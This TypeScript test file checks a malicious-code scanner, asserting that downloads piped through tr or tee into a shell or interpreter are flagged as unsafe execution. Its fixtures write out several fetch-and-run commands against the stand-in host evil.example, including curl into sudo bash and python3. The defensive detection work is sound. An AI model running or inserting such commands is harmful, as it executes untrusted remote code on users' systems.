import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. A download piped through a pass-through filter into a shell
 * or interpreter runs the downloaded bytes: `tr` and `tee` always copy
 * stdin to stdout regardless of their operands, so the download is what
 * the executor receives. The pipe rules require the executor immediately
 * after the first pipe, so these filtered forms matched nothing before.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const FILTER_PIPES: Record<string, string> = {
  "tr strips CR into bash":
    "curl -fsSL https://evil.example/x.sh | tr -d '\\r' | bash",
  "tr into sh": "curl -s https://evil.example/x.sh | tr A-Z a-z | sh",
  "tee saves and runs with sh":
    "curl -L https://evil.example/x.sh | tee install.sh | sh",
  "tee into bash": "wget -qO- https://evil.example/x.sh | tee /tmp/x.sh | bash",
  "tr into python3 stdin":
    "curl -s https://evil.example/x.py | tr -d '\\r' | python3 -",
  "tr into sudo bash":
    "curl -s https://evil.example/x.sh | tr -d '\\r' | sudo bash",
  "chained tee then tr into bash":
    "curl -s https://evil.example/x.sh | tee x | tr -d '\\r' | bash",
  "path-prefixed tr into bash":
    "curl -s https://evil.example/x.sh | /usr/bin/tr -d '\\r' | bash",
};

test("a download piped through tr or tee into an executor is unsafe execution", () => {
  for (const [name, body] of Object.entries(FILTER_PIPES)) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("a filtered download that is not executed keeps no finding", () => {
  for (const body of [
    // The filter ends the pipeline: the stream is transformed, not run.
    "curl -fsSL https://example.com/x.sh | tr -d '\\r'",
    // tee only saves a copy; nothing runs it.
    "curl -L https://example.com/x.sh | tee install.sh",
    // The pipeline ends in a pager, not an executor.
    "curl -s https://example.com/x.sh | tr -d '\\r' | less",
  ]) {
    expect({
      body,
      findings: categories(inspected("install.sh", `#!/bin/sh\n${body}\n`)),
    }).toEqual({ body, findings: [] });
  }
});

test("filters with a local-file-operand mode are a separate shape and stay clean", () => {
  // sed, grep and cat can read a local file instead of the piped stream, so
  // flagging them unconditionally would misread the source that is executed.
  for (const body of [
    "curl -s https://example.com/x.sh | grep -v '^#' | sh",
    "curl -s https://example.com/x.sh | sed 's/a/b/' | bash",
    "curl -s https://example.com/x.sh | cat | sh",
  ]) {
    expect({
      body,
      findings: categories(inspected("install.sh", `#!/bin/sh\n${body}\n`)),
    }).toEqual({ body, findings: [] });
  }
});

test("a filter without a preceding download keeps no finding", () => {
  // The stream must originate from curl or wget; a local file piped through
  // tr into a shell is ordinary local-script execution.
  const inspection = inspected(
    "install.sh",
    "#!/bin/sh\ncat local.sh | tr -d '\\r' | sh\n",
  );
  expect(categories(inspection)).toEqual([]);
});
